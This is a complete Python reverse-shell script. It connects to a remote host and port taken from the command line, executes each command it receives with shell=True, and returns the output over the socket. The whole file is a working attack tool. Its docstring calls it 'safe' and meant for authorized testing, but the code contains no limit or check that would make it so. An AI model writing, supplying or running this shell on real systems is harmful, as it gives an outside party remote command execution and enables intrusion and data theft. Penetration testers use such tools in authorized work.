#!/usr/bin/env python3
"""
Python Reverse Shell
Safe reverse shell payload for authorized testing
"""

import socket
import subprocess
import sys
import os

def reverse_shell(host, port):
    """Connect to remote host and provide shell access"""
    try:
        # Create socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Send welcome message
        s.send(b"Python Reverse Shell Connected\n")
        
        while True:
            # Receive command
            data = s.recv(1024).decode('utf-8').strip()
            
            if data.lower() in ['exit', 'quit']:
                break
            
            # Execute command
            try:
                result = subprocess.run(data, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                s.send(output.encode('utf-8'))
            except Exception as e:
                s.send(f"Error: {e}\n".encode('utf-8'))
        
        s.close()
        
    except Exception as e:
        print(f"Connection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python python_shell.py <host> <port>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    print(f"Connecting to {host}:{port}")
    reverse_shell(host, port)
